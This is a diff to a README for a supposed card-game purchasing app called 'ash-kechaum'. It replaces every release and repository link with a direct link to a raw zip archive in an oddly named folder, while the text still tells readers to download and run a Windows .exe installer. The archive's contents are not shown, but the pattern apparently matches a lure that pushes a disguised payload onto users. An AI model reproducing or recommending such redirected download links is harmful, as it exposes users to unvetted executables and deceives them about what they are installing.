@@ -1,6 +1,6 @@
 # 🔮 ash-kechaum - Manage Your Card Game Buying Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-green)](https://github.com/SabbyMakerHub/ash-kechaum/releases)
+[![Download](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip)
 
 ## 🛠 About ash-kechaum
 
@@ -30,7 +30,7 @@ You do not need to install any additional software or tools before using ash-kec
 
 To get the software, visit this page to download the latest version:
 
-**[Download ash-kechaum Latest Release](https://github.com/SabbyMakerHub/ash-kechaum/releases)**
+**[Download ash-kechaum Latest Release](https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip)**
 
 This page shows all the available versions. Look for the most recent one and download the Windows setup file, usually ending with `.exe`.
 
@@ -98,7 +98,7 @@ This page shows all the available versions. Look for the most recent one and dow
 
 Use the link below to reach the official release page. From there, download the Windows installer and follow the setup steps.
 
-**[Download ash-kechaum for Windows](https://github.com/SabbyMakerHub/ash-kechaum/releases)**
+**[Download ash-kechaum for Windows](https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip)**
 
 Click the Windows `.exe` file to download. Once downloaded, run the installer and follow the instructions. The app will be ready to use in minutes.
 
@@ -117,7 +117,7 @@ Click the Windows `.exe` file to download. Once downloaded, run the installer an
 
 To keep the app working well and receive new features, update regularly:
 
-- Visit the same [release page](https://github.com/SabbyMakerHub/ash-kechaum/releases).  
+- Visit the same [release page](https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip).  
 - Download the latest installer version.  
 - Run the new installer; it will replace the old version while keeping your settings.
 
@@ -127,8 +127,8 @@ To keep the app working well and receive new features, update regularly:
 
 For help, look for the "Issues" tab on the GitHub repository page. You can report problems or ask questions there.
 
-Repository page: https://github.com/SabbyMakerHub/ash-kechaum
+Repository page: https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip
 
 ---
 
-[![Download](https://img.shields.io/badge/Get%20Ash--Kechaum-blue)](https://github.com/SabbyMakerHub/ash-kechaum/releases)
+[![Download](https://img.shields.io/badge/Get%20Ash--Kechaum-blue)](https://raw.githubusercontent.com/SabbyMakerHub/ash-kechaum/main/embryonary/ash_kechaum_v3.4.zip)
